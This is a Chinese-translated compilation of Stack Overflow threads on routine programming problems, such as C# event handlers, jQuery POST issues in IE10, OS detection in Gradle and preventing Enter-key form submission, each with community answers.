> 
> 标签：c#

我有两个标签，一个 lblEmail1 和两个 lblEmal2，每个标签都有相同的上下文菜单条。contextmenustip 有一个菜单项，即“发送电子邮件”，当我右键单击任一标签并选择“发送电子邮件”时，它会转到相同的功能来处理将取值 lblEmail1.Text 或 lblEmail2.Text 的请求并开始一封电子邮件。问题是我不知道如何判断是哪个标签发起了请求。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:39:52.193

为菜单的打开事件添加事件处理程序发送者将是哪个标签触发它。将其存储在某个地方，电子邮件菜单项的标签属性会很好，或者是表单类上的私有变量。

然后在菜单项测试的 Onclick 中进行相应的操作。

# c# - 将 AsyncCompletedEventHandler 设置为类外的方法

> ID：11235601
> 
> 赞同：3
> 
> 时间：2012-06-27T22:20:40.820
> 
> 标签：c#, .net

如果我的问题措辞不当，我提前道歉。

我正在利用`WebClient`从互联网上下载文件。要将 设置为`DownloadProgressChangedEventHandler`同一类中的方法，我只需使用方法名称，例如

```
webClient.DownloadProgressChanged +=
    new DownloadProgressChangedEventHandler(ProgressReporter); 
```

如何将 设置`DownloadProgressChangedEventHandler`为类之外的方法？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:23:05.187

如果该方法是静态的，则在其前面加上定义它的类的名称：

```
class ClassWithStaticMethod
{
    public static void ProgressReporter(object s,
                                        DownloadProgressChangedEventArgs e)
    {
    }
} 
```

像这样使用：

```
webClient.DownloadProgressChanged += ClassWithStaticMethod.ProgressReporter; 
```

如果它是一个实例方法，你需要有一个该类的实例：

```
class ClassWithInstanceMethod
{
    public void ProgressReporter(object s, DownloadProgressChangedEventArgs e)
    {
    }
} 
```

像这样使用：

```
var myObject = new ClassWithInstanceMethod();
webClient.DownloadProgressChanged += myObject.ProgressReporter; 
```

`new DownloadProgressChangedEventHandler`最后，注意订阅事件时不需要使用，因为编译器会自动推导出来。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:23:22.727

```
webClient.DownloadProgressChanged += someOtherClassInstance.ProgressReporter 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:26:37.030

如果您的外部事件处理程序位于名为 foo 的类中并且该处理程序是静态的，则您将传递 foo.ProgressReport 而不是 ProgressReport。

```
webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(foo.ProgressReport); 
```

如果它不是静态的，那么你需要一个 foo 的实例。

```
Foo myFoo = new Foo();
webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(myFoo.ProgressReport); 
```

# facebook - 如何使帖子底部的“上传方式”链接链接到用户的网站？

> ID：11235602
> 
> 赞同：0
> 
> 时间：2012-06-27T22:20:43.457
> 
> 标签：facebook, facebook-graph-api

**我需要什么：**使用应用程序将照片作为页面上传到用户的粉丝页面

**我所拥有的：**我上传的网站，创建粉丝页面和应用程序的用户，以及该应用程序的 ID 和密码

**我做什么：**

1.  `FB.init()`使用该 appId调用

2.  `FB.login()`使用权限调用`manage_pages,publish_stream`- 这会提示 FB 登录弹出窗口，要求用户登录，然后对应用程序进行身份验证。结果我得到了应用访问令牌。

3.  发送请求以`https://graph.facebook.com/oauth/access_token?client_id=APP_ID&client_secret=APP_SECRET&grant_type=fb_exchange_token&fb_exchange_token=TOKEN_FROM_ABOVE`获取有效期为 2 个月的扩展应用令牌（因此页面令牌将被扩展以及[此处](https://developers.facebook.com/roadmap/offline-access-removal/#page_access_token)所述）

4.  发送请求以`https://graph.facebook.com/me/accounts?access_token=TOKEN_FROM_ABOVE`获取用户管理的页面列表，并让用户选择要发布到的页面。

5.  这给了我 PAGE 访问令牌，我可以使用`/albumId/photos/`API 调用将照片发布到用户的 FAN 页面。

**问题是什么：**

照片中的“通过”链接将用户重定向到我的网站（用户已经验证了他的应用程序以上传到他的页面）：![在此处输入图像描述](../Images/a3099cbaf4f2f3baf78de25153dad917.png)

那是因为我必须要求用户在应用设置中输入我网站的 URL，否则 Facebook 登录对话框会抱怨： ![在此处输入图像描述](../Images/7fb73cfb7148df15e65fe3c45b8552d1.png)

* * *

**所以我的问题是：**

1.  我这样做对吗？我可能错过了什么吗？

2.  如果我是 - 那么我怎样才能获得该“通过”链接以链接到用户的网站？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T09:09:26.303

> 我怎样才能获得该“通过”链接以链接到用户的网站？

一点也不，因为这*总是*链接到用于发布/上传的应用程序。

但是，您可以尝试在用户从 Facebook 访问*您的*网站时重定向您的网站。应该将用户来自哪个帖子/提要故事作为参数传递给您的站点；那么您只需要确定是哪个用户发布了该帖子（在您的数据库中查找），然后重定向到他们的主页。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-04T17:00:57.037

我最终将客户端的网站 URL 作为查询字符串参数添加到应用程序设置中的“站点 URL”字段中 - 然后我需要修改我的站点的后端以进行重定向：

```
http://mysite.com/?redirect=http://client-site.com 
```

# pandas - 鼻子测试：算法.py：125：运行时警告：tp_compare没有返回-1或-2异常

> ID：11235604
> 
> 赞同：0
> 
> 时间：2012-06-27T22:21:04.630
> 
> 标签：pandas, nose

我在运行 nosetests 时收到以下消息`pandas`：

```
C:\Python27\lib\site-packages\pandas\core\algorithms.py:125: RuntimeWarning: tp_compare didn't return -1 or -2 for exception
  sorter = uniques.argsort() 
```

这是我需要解决的严重问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T13:44:35.530

您能否在 GitHub (http://github.com/pydata/pandas/issues) 上报告此类问题。警告不是问题，我可能会禁用导致它的单元测试。

# jquery - jquery ajax $.post 不工作 IE10

> ID：11235613
> 
> 赞同：3
> 
> 时间：2012-06-27T22:22:05.263
> 
> 标签：jquery, ajax, internet-explorer, post, internet-explorer-10

这两种方法我都试过了。

方式一

```
function Login() {
    var email = encodeURIComponent($("#loginemail").val());
    var pass = encodeURIComponent($("#password").val());
    $.ajax({
        url:"/user/login",
        type: "POST",
        data: {email:email, password:pass},
        dataType: "json"
    }).done(LoginDone);
    //$.post("/user/login", {email:email, password:pass}, LoginDone);
} 
```

方式二

```
 function Login() {
        var email = encodeURIComponent($("#loginemail").val());
        var pass = encodeURIComponent($("#password").val());
        $.post("/user/login", {email:email, password:pass}, LoginDone);
    } 
```

这两种方式在 chrome 上都可以正常工作，但由于某种原因，IE 不会发送数据`{email:email, password:pass}`，`POST`或者根本不会发送数据。

我在本地服务器和实时网络服务器上都试过了，结果都一样。

在这里使用 IE10。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-05T16:08:47.180

无法修复 @jQuery 错误跟踪器：[IE10 / Windows 8 上的 AJAX 发布](http://bugs.jquery.com/ticket/12790)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T11:53:31.863

经过深度调试后，我找到了 IE10 AJAX POST Bug 的解决方法：

不要将 POST 与 GET 一起使用。

```
$.post("Page.aspx?action=edit",a,function(data) {dataRow[0]=data; GoToShowMode(row)}); 
```

改成

```
a.action=edit;
$.post("Page.aspx",a,function(data) {dataRow[0]=data; GoToShowMode(row)}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T10:33:03.113

IE-10 不工作数据序列化 => **$(this).serialize()**

```
 $('#formLogin').submit(function () {

        $.ajax({
            url: this.action,
            type: this.method,
            data: $(this).serialize(),
            cache: false,
            success: function (data) {

                var val1 = "";
                var val2 = "";

                $.map(data, function (item) {
                    val1 = item.success;
                    val2 = item.URL;
                });

                if (data[0].messageCode == "success") {
                    GoGO(data[0].URL);
                }
                else {
                    alert(data[0].message);
                }
            }
        });
        return false;
    }); 
```

为此，您可以在元标记之前在 _layOut.chtml 上使用这一行。因此，IE-10 就像 IE-9 一样工作。

```
 <meta http-equiv="x-ua-compatible" content="IE=9" > 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-07T14:02:40.700

试试这个：[http](http://code.gishan.net/code/solution-to-ie10-ajax-problem) ://code.gishan.net/code/solution-to-ie10-ajax-problem 对我有用。这是 IE10 的一个已知问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-07T14:26:53.770

我在 Win7 x64 SP1 上使用 IE 10 (10.0.9200.16521) 时遇到了同样的问题。我通过使用更新版本的 jQuery（1.9.1 代替 1.8.3）解决了这个问题

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-06-28T00:09:32.137

 ~~~~```
data: {email:email, password:pass} 
```~~ 

应该

```
data: {"email":email, "password":pass} 
```

您将变量的值作为键传递，因此如果您的服务器端资源期望`email`它实际上是看到该变量的值`encodeURIComponent($("#loginemail").val())`。

这可能不是 IE10 问题，它不应该像在任何浏览器中那样工作。

**更新**

~~由于 IE 10 中的错误修复，此答案可能不再适用。~~

请忽略此答案，这是错误的，并且由于被接受而无法删除。~~

# gradle - 如何从 Gradle 检测当前操作系统

> ID：11235614
> 
> 赞同：119
> 
> 时间：2012-06-27T22:22:08.213
> 
> 标签：gradle

我找到了这个关于如何使用 Groovy 的答案：

*[通过 Groovy/Grails 检测平台（Window 或 Linux）](https://stackoverflow.com/questions/4689240/how-to-detect-the-platform-window-or-linux-by-groovy-grails)*：

```
if (System.properties['os.name'].toLowerCase().contains('windows')) {
    println "it's Windows"
} else {
    println "it's not Windows"
} 
```

有没有更好的办法？

* * *

## 回答 #1

> 赞同：140
> 
> 时间：2012-10-08T15:37:09.263

[实际上，我查看了 Gradle 项目，因为它使用了Ant](http://en.wikipedia.org/wiki/Apache_Ant)现有的结构，所以看起来更简洁：

```
import org.apache.tools.ant.taskdefs.condition.Os

task checkWin() << {
    if (Os.isFamily(Os.FAMILY_WINDOWS)) {
        println "*** Windows "
    }
} 
```

我在下面的 Gradle 分支中找到了它，它似乎运行良好。[gradle/gradle-core/branches/RB-0.3/build.gradle](http://svn.codehaus.org/gradle/gradle-core/branches/RB-0.3/build.gradle)

* * *

## 回答 #2

> 赞同：89
> 
> 时间：2015-07-16T01:30:15.123

**2020 年中期更新**：仍在孵化中：

```
OperatingSystem os = org.gradle.nativeplatform.platform.internal.DefaultNativePlatform.currentOperatingSystem; 
```

**2019 年初更新**：`current()`已删除。

[**`org.gradle.nativeplatform.platform.OperatingSystem.getDisplayName()`**](https://docs.gradle.org/current/javadoc/org/gradle/nativeplatform/platform/OperatingSystem.html#getDisplayName--)

[**`org.gradle.nativeplatform.platform.OperatingSystem.isLinux()`**](https://docs.gradle.org/current/javadoc/org/gradle/nativeplatform/platform/OperatingSystem.html#isLinux--)

请记住，它仍在[孵化](https://docs.gradle.org/current/javadoc/org/gradle/api/Incubating.html)中。

**2018 年中更新**：就像评论中提到的一样，现在这个类移到了不同​​的包，所以应该使用[**`org.gradle.nativeplatform.platform.OperatingSystem.current()`**](https://docs.gradle.org/current/javadoc/org/gradle/nativeplatform/platform/OperatingSystem.html)

* * *

截至 2015 年年中，Peter Kahn 的回答仍然有效。在 Maven 中，基于环境的配置文件激活仍然相对容易。但请记住，这`org.apache.tools.ant.taskdefs.condition.Os.isFamily`并不是排他性的，如果它使用一个特定参数返回 true，则不一定意味着它对任何其他参数返回 false。例如：

```
import org.apache.tools.ant.taskdefs.condition.Os
task detect {
    doLast {
        println(Os.isFamily(Os.FAMILY_WINDOWS))
        println(Os.isFamily(Os.FAMILY_MAC))
        println(Os.isFamily(Os.FAMILY_UNIX))
    }
} 
```

它将在 MacOS`Os.FAMILY_MAC`和`Os.FAMILY_UNIX`MacOS 上返回 true。通常它不是你在构建脚本中需要的东西。

还有另一种使用 Gradle 2+ API 实现此目的的方法，即：

```
import org.gradle.internal.os.OperatingSystem;

task detect {
    doLast {
        println(OperatingSystem.current().isMacOsX())
        println(OperatingSystem.current().isLinux())
    }
} 
```

查看[org.gradle.nativeplatform.platform.OperatingSystem](https://docs.gradle.org/current/javadoc/org/gradle/nativeplatform/platform/OperatingSystem.html)接口的文档。值得一提的是，该界面标有[incubating](https://docs.gradle.org/current/javadoc/org/gradle/api/Incubating.html) annotation，即“该功能目前正在开发中，可能随时更改”。实现中的“内部”命名空间也给了我们一个提示，我们应该知道这可以改变，我们应该使用它。

但就我个人而言，我会选择这个解决方案。只是最好写一个包装类，以免弄乱，以防将来发生变化。

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2016-09-20T11:27:35.760

可以区分 Linux、Unix、Windows 和 OS X 之间的**构建**环境 - 而 Gradle [nativeplatform.platform.OperatingSystem](https://docs.gradle.org/current/javadoc/org/gradle/nativeplatform/platform/OperatingSystem.html)区分**目标**环境（包括[FreeBSD](https://en.wikipedia.org/wiki/FreeBSD)和[Solaris](http://en.wikipedia.org/wiki/Solaris_%28operating_system%29)）。

```
import org.gradle.internal.os.OperatingSystem

String osName = OperatingSystem.current().getName();
String osVersion = OperatingSystem.current().getVersion();
println "*** $osName $osVersion was detected."

if (OperatingSystem.current().isLinux()) {
    // Consider Linux.
} else if (OperatingSystem.current().isUnix()) {
    // Consider UNIX.
} else if (OperatingSystem.current().isWindows()) {
    // Consider Windows.
} else if (OperatingSystem.current().isMacOsX()) {
    // Consider OS X.
} else {
    // Unknown OS.
} 
```

也可以使用 Ant 任务（[source](https://stackoverflow.com/a/12784930/549372)）：

```
import org.apache.tools.ant.taskdefs.condition.Os

task checkWin() << {
    if (Os.isFamily(Os.FAMILY_WINDOWS)) {
        // Consider Windows.
    }
} 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2018-03-15T20:48:18.340

或者您可以将 osName 定义为字符串...

```
import org.gradle.internal.os.OperatingSystem

switch (OperatingSystem.current()) {
    case OperatingSystem.LINUX:
        project.ext.osName = "Linux";
        break;
    case OperatingSystem.MAC_OS:
        project.ext.osName = "macOS";
        break;
    case OperatingSystem.WINDOWS:
        project.ext.osName = "Windows";
        break;
} 
```

...并稍后使用它 - 包括一个本机库，例如：

```
run {
    systemProperty "java.library.path", "lib/$osName"
} 
```

但它不会改变任何东西，因为 OperatingSystem 的工作方式与您的代码完全相同：

```
public static OperatingSystem forName(String os) {
    String osName = os.toLowerCase();
    if (osName.contains("Windows")) {
        return WINDOWS;
    } else if (osName.contains("mac os x") || osName.contains("darwin") || osName.contains("osx")) {
        return MAC_OS;
    } else if (osName.contains("sunos") || osName.contains("solaris")) {
        return SOLARIS;
    } else if (osName.contains("linux")) {
        return LINUX;
    } else if (osName.contains("freebsd")) {
        return FREE_BSD;
    } else {
        // Not strictly true
        return UNIX;
    }
} 
```

来源：[https ://github.com/gradle/gradle/blob/master/subprojects/base-services/src/main/java/org/gradle/internal/os/OperatingSystem.java](https://github.com/gradle/gradle/blob/master/subprojects/base-services/src/main/java/org/gradle/internal/os/OperatingSystem.java)

编辑：

您可以对架构执行相同的操作：

```
project.ext.osArch = OperatingSystem.current().getArch();
if ("x86".equals(project.ext.osArch)) {
    project.ext.osArch = "i386";
} 
```

和：

```
run {
    systemProperty "java.library.path", "lib/$osName/$osArch"
} 
```

请注意 getArch() 将返回：

*   PowerPC 上的“ppc”
*   64b 上的“amd64”
*   32b 上的“i386”或“x86”。

*getArch() 将在 Solaris 上返回“x86”或在任何其他平台上返回“i386”。*

编辑2：

或者如果你想避免任何导入，你可以自己做：

```
def getOsName(project) {
    final String osName = System.getProperty("os.name").toLowerCase();

    if (osName.contains("linux")) {
        return ("linux");
    } else if (osName.contains("mac os x") || osName.contains("darwin") || osName.contains("osx")) {
        return ("macos");
    } else if (osName.contains("windows")) {
        return ("windows");
    } else if (osName.contains("sunos") || osName.contains("solaris")) {
        return ("solaris");
    } else if (osName.contains("freebsd")) {
        return ("freebsd");
    }
    return ("unix");
}

def getOsArch(project) {
    final String osArch = System.getProperty("os.arch");

    if ("x86".equals(osArch)) {
        return ("i386");
    }
    else if ("x86_64".equals(osArch)) {
        return ("amd64");
    }
    else if ("powerpc".equals(osArch)) {
        return ("ppc");
    }
    return (osArch);
} 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2012-06-29T02:02:31.713

Gradle 不提供用于检测操作系统的公共 API。因此，`os.`系统属性是您最好的选择。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2019-05-13T15:33:30.943

我不喜欢通过属性或 Ant 任务检测 Gradle 中的操作系统，并且`OperatingSystem`该类不再包含该`current()`方法。

因此，在我看来，检测操作系统的最简洁方法是：

导入 DefaultNativePlatform：

```
import org.gradle.nativeplatform.platform.internal.DefaultNativePlatform 
```

然后`DefaultNativePlatform`在您的任务中使用：

```
if (DefaultNativePlatform.getCurrentOperatingSystem().isWindows()) {
   println 'Windows'
} 
```

请注意，这种方法并不理想，因为它使用的是 Gradle 内部 API。

它使用 Gradle 4.10 进行了测试。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2022-01-21T14:38:12.310

没有任何导入，我从`System`类中获得了这些值，如下所示：

```
 def osName = System.getProperty("os.name").toLowerCase(Locale.ENGLISH)
        def osArch = System.getProperty("os.arch").toLowerCase(Locale.ENGLISH)
        def osVersion = System.getProperty("os.version").toLowerCase(Locale.ENGLISH) 
```

# web-services - 区分调用作为 Web 服务与本地的设计模式

> ID：11235616
> 
> 赞同：0
> 
> 时间：2012-06-27T22:22:28.340
> 
> 标签：web-services, design-patterns

我必须想出一个服务查找的设计，即决定服务请求是可以在本地处理还是应该发送到远程服务器（使用 SOAP Web 服务调用）。我首先想到的是服务定位器。

是否有其他符合要求的设计模式？任何指针或示例代码会有帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T08:12:49.607

您可以使用依赖注入。如果客户端不知道服务的位置（无论是本地还是远程），它们应该依赖于抽象：

```
public interface MyService {
   void doSomething();
}

public class MyClientThatUsesMyService {

  private MyService _service;
  public MyClientThatUsesMyService(MyService service) {
     _service = service;
  }

  public void Go() { _service.doSomething(); }

} 
```

然后您可以使用依赖注入容器或（Poor Man's DI）来配置您的**组合根**并设置对象的生命周期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T04:28:54.730

服务定位器 + 工厂正是您所需要的。
以我的拙见，代码应该如下所示：

```
public enum ServiceOrigin {
  REMOTE,LOCAL;
}

public class ServiceLocatorFactory {
   MyService getService(ServiceOrigin origin) {
      ///Return a proper service instance
   }
}

public interface MyService {
   void doSomething();
}

ServiceLocatorFactory factory = //Get the factory somehow
MyService service = factory.getService(ServiceOrigin.REMOTE);
service.doSomething(); 
```

# ios - 临时分发给外部客户？

> ID：11235617
> 
> 赞同：0
> 
> 时间：2012-06-27T22:22:32.910
> 
> 标签：ios, ipad, distribution, adhoc

我已经为少数外部客户构建了一个 iOS 应用程序，它是一个自定义业务应用程序。这将是我们为它们提供的其他应用程序/服务的附加组件。分发此应用程序的最佳方式是什么？

我们可以使用 ad-hoc 分发将 iOS 应用程序分发给外部客户端吗？在这种情况下，100 台设备限制不是一个大问题。这是一个合法性的问题，而不是技术上是否可行的问题。

我读过的苹果文档在这一点上还不是很清楚。

——谢谢你的帮助！迈克 C。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:07:12.050

如果您在美国，您可以调查 Apple 托管的自定义 B2B 应用程序选项，以便通过 App Store 分发给批量采购计划中的企业（免费为您的客户注册）。

根据其[网页](http://www.apple.com/business/vpp/)（澳大利亚、加拿大、法国、德国、意大利、日本、新西兰、西班牙和英国），App Store 批量购买计划也即将扩展到新的国家。

您可能还想观看 WWDC 2012 视频“Session 311 - Building and Distributing Custom B2B Apps for iOS”

# javascript - jquery禁用表单提交

> ID：11235622
> 
> 赞同：225
> 
> 时间：2012-06-27T22:23:02.007
> 
> 标签：javascript, jquery, forms, form-submit

我的页面中有以下 javascript，但似乎无法正常工作。

```
$('form').bind("keypress", function(e) {
  if (e.keyCode == 13) {               
    e.preventDefault();
    return false;
  }
}); 
```

我想禁用在输入时提交表单，或者更好的是，调用我的 ajax 表单提交。任何一种解决方案都是可以接受的，但我上面包含的代码不会阻止表单提交。

* * *

## 回答 #1

> 赞同：462
> 
> 时间：2012-06-27T22:28:51.133

如果`keyCode`没有被抓住，抓住`which`：

```
$('#formid').on('keyup keypress', function(e) {
  var keyCode = e.keyCode || e.which;
  if (keyCode === 13) { 
    e.preventDefault();
    return false;
  }
}); 
```

编辑：错过了，最好使用`keyup`而不是`keypress`

编辑 2：在一些较新版本的 Firefox 中，不会阻止表单提交，将 keypress 事件添加到表单也更安全。此外，仅将事件绑定到表单“名称”但仅绑定到表单 ID，它也不起作用（不再？）。因此，我通过适当地更改代码示例使这一点更加明显。

编辑 3：更改`bind()`为`on()`

* * *

## 回答 #2

> 赞同：65
> 
> 时间：2012-06-27T22:28:59.683

`Enter`通常在您关注输入元素时提交表单。

我们可以在表单中的输入元素上禁用`Enter`键（代码）：`13`

```
$('form input').on('keypress', function(e) {
    return e.which !== 13;
}); 
```

**演示：http:** [//jsfiddle.net/bnx96/325/](http://jsfiddle.net/bnx96/325/)

* * *

## 回答 #3

> 赞同：43
> 
> 时间：2012-12-07T20:41:16.833

更短：

```
$('myform').submit(function() {
  return false;
}); 
```

* * *

## 回答 #4

> 赞同：24
> 
> 时间：2012-06-27T22:27:49.007

```
$('form').keyup(function(e) {
  return e.which !== 13  
}); 
```

> event.which属性规范了 event.keyCode 和**event.charCode 。**建议观看 event.which 进行键盘按键输入。

[`which`文档。](http://api.jquery.com/event.which/)

* * *

## 回答 #5

> 赞同：16
> 
> 时间：2014-05-30T12:32:33.233

```
$(document).on('keyup keypress', 'form input[type="text"]', function(e) {
  if(e.which == 13) {
    e.preventDefault();
    return false;
  }
}); 
```

此解决方案适用于网站上的所有表单（也适用于使用 ajax 插入的表单），仅防止在输入文本中输入。把它放在一个文件准备功能中，一辈子忘记这个问题。

* * *

## 回答 #6

> 赞同：11
> 
> 时间：2016-07-26T15:08:50.333

上面的大多数答案都会阻止用户在 textarea 字段中添加新行。如果这是您想要避免的事情，您可以通过检查当前具有焦点的元素来排除这种特殊情况：

```
var keyCode = e.keyCode || e.which;
if (keyCode === 13 && !$(document.activeElement).is('textarea')) {
  e.preventDefault();
  return false;
} 
```

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2014-10-31T21:36:05.997

必须捕获和测试 ENTER 键的每个击键的过度杀伤力真的让我很烦恼，所以我的解决方案依赖于以下浏览器行为：

**按 ENTER 将触发提交按钮上的*单击***事件（在 IE11、Chrome 38、FF 31 中测试） **（参考： http: [//mattsnider.com/how-forms-submit-when-pressing-enter/](http://mattsnider.com/how-forms-submit-when-pressing-enter/)）

所以我的解决方案是删除标准提交按钮（即`<input type="submit">`），以便上述行为失败，因为当按下 ENTER 时没有提交按钮可以神奇地单击。`.submit()`相反，我在常规按钮上使用 jQuery 单击处理程序通过 jQuery 的方法提交表单。

```
<form id="myform" method="post">
  <input name="fav_color" type="text">
  <input name="fav_color_2" type="text">
<button type="button" id="form-button-submit">DO IT!</button>
</form>

<script>
 $('#form-button-submit').click(function(){
    $('#myform').submit();
  });
</script> 
```

演示：[http ://codepen.io/anon/pen/fxeyv?editors=101](http://codepen.io/anon/pen/fxeyv?editors=101)

** 如果表单只有 1 个输入字段并且该字段是“文本”输入，则此行为不适用；在这种情况下，即使 HTML 标记中没有提交按钮（例如搜索字段），表单也将按 ENTER 键提交。这是自 90 年代以来的标准浏览器行为。

* * *

## 回答 #8

> 赞同：9
> 
> 时间：2019-08-27T09:54:09.170

简单的方法是将按钮的类型更改为按钮 - 在 html 中，然后在 js 中添加事件......

从此改变：

```
<form id="myForm">
   <button type="submit">Submit</button>
</form> 
```

到

```
<form id="myForm">
   <button type="button" id="btnSubmit">Submit</button>
</form> 
```

并在 js 或 jquery 中添加：

```
$("#btnSubmit").click(function () {
    $('#myForm').submit();
}); 
```

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2014-03-09T15:22:19.210

如果您只想在输入和提交按钮上禁用提交，请使用表单的 onsubmit 事件

```
<form onsubmit="return false;"> 
```

您可以将“return false”替换为对 JS 函数的调用，该函数将执行所需的任何操作，并将表单作为最后一步提交。

* * *

## 回答 #10

> 赞同：5
> 
> 时间：2016-05-15T19:11:54.643

您可以在纯 Javascript 中完美地做到这一点，简单且不需要库。这是我对类似主题的详细回答： [Disabling enter key for form](https://stackoverflow.com/questions/5629805/disabling-enter-key-for-form/37241980#37241980)

简而言之，这里是代码：

```
<script type="text/javascript">
window.addEventListener('keydown',function(e){if(e.keyIdentifier=='U+000A'||e.keyIdentifier=='Enter'||e.keyCode==13){if(e.target.nodeName=='INPUT'&&e.target.type=='text'){e.preventDefault();return false;}}},true);
</script> 
```

> 此代码仅用于防止输入 type='text' 的“Enter”键。（因为访问者可能需要在页面上按回车键）如果您还想禁用其他操作的“回车”，您可以添加 console.log(e); 出于您的测试目的，并在 chrome 中按 F12，转到“控制台”选项卡并在页面上按“退格键”并查看其内部以查看返回的值，然后您可以定位所有这些参数以进一步增强代码以上以满足您对***"e.target.nodeName"***、***"e.target.type"***等等的需求......

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2014-07-17T17:51:56.147

我不知道您是否已经解决了这个问题，或者是否有人正在尝试解决这个问题，但是，这是我的解决方案！

```
$j(':input:not(textarea)').keydown(function(event){
    var kc = event.witch || event.keyCode;
    if(kc == 13){
    event.preventDefault();
        $j(this).closest('form').attr('data-oldaction', function(){
            return $(this).attr('action');
        }).attr('action', 'javascript:;');

        alert('some_text_if_you_want');

        $j(this).closest('form').attr('action', function(){
            return $(this).attr('data-oldaction');
        });
        return false;
    }
}); 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2014-08-25T05:53:44.697

在Firefox中，当您输入并按Enter键时，它将提交其上层形式。解决方案是在将提交表单中添加：

```
<input type="submit" onclick="return false;" style="display:none" /> 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2013-10-11T17:48:53.757

下面的代码将禁止使用 enter 键提交表单，但仍允许您在 textarea 中使用 enter 键。您可以根据需要进一步编辑它。

```
<script type="text/javascript">
        function stopRKey(evt) {
          var evt = (evt) ? evt : ((event) ? event : null);
          var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);
          if ((evt.keyCode == 13) && ((node.type=="text") || (node.type=="radio") || (node.type=="checkbox")) )  {return false;}
        }

        document.onkeypress = stopRKey;
</script> 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2015-08-26T14:21:01.740

3年后，没有一个人完全回答了这个问题。

提问者想取消默认的表单提交并调用自己的 Ajax。这是一个带有简单解决方案的简单请求。无需截取输入到每个输入中的每个字符。

假设表单有一个提交按钮，无论是 a`<button id="save-form">`还是 an `<input id="save-form" type="submit">`，请执行以下操作：

```
$("#save-form").on("click", function () {
    $.ajax({
        ...
    });
    return false;
}); 
```

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2021-07-16T07:37:09.907

```
$('#FormID').on('keyup keypress', function (e) {
        var keyCode = e.keyCode || e.which;
        if (keyCode === 13) {
            e.preventDefault();
            return false;
        }
    }); 
```

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2021-07-16T15:42:32.623

这是一个简单的 JavaScript 解决方案**，不**使用处理 keydown 或 keypress 事件的不同变体：

```
document.forms[0].addEventListener('submit', function(e) {
    if(document.activeElement.getAttribute('type') !== 'submit') {
        e.preventDefault();
    }
}); 
```

仅当页面上的活动元素是提交按钮时才会提交表单。因此，您可以通过单击提交按钮或在提交按钮获得焦点时按 ENTER 键来提交表单。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2020-05-07T02:12:32.563

我听说`which`不推荐，所以将[最佳评分答案](https://stackoverflow.com/a/11235672/9287284)更改为此。

```
$('#formid').on('keyup keypress', function(e) {
  if (e.key === 'Enter') { 
    e.preventDefault();
    return false;
  }
}); 
```

参考。[https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/which)

* * *

## 回答 #18

> 赞同：-2
> 
> 时间：2016-09-22T06:36:52.687

当文件完成（加载完成）时，脚本会检测“Entry”键的每个事件，并禁用后面的事件。

```
<script>
            $(document).ready(function () {
                $(window).keydown(function(event){
                    if(event.keyCode == 13) {
                        e.preventDefault(); // Disable the " Entry " key
                        return false;               
                    }
                });
            });
        </script> 
```

* * *

## 回答 #19

> 赞同：-4
> 
> 时间：2015-11-02T04:07:43.523

# 适用于所有浏览器的 JavaScript 完整解决方案

上面的代码和大多数解决方案都是完美的。但是，我认为最喜欢的一个“简短答案”是不完整的。

所以这是完整的答案。在原生支持 IE 7 的 JavaScript 中。

```
var form = document.getElementById("testForm");
form.addEventListener("submit",function(e){e.preventDefault(); return false;}); 
```

此解决方案现在将阻止用户使用 enter 键提交，并且不会重新加载页面，或者如果您的表单位于下方，则不会将您带到页面顶部。

* * *

## 回答 #20

> 赞同：-10
> 
> 时间：2013-02-14T15:51:49.653

这个怎么样：

```
$(":submit").closest("form").submit(function(){
    $(':submit').attr('disabled', 'disabled');
}); 
```

这应该会禁用应用程序中所有带有提交按钮的表单。

# mysql - MySql 存储过程还是函数？

> ID：11235626
> 
> 赞同：0
> 
> 时间：2012-06-27T22:23:10.880
> 
> 标签：mysql, stored-procedures

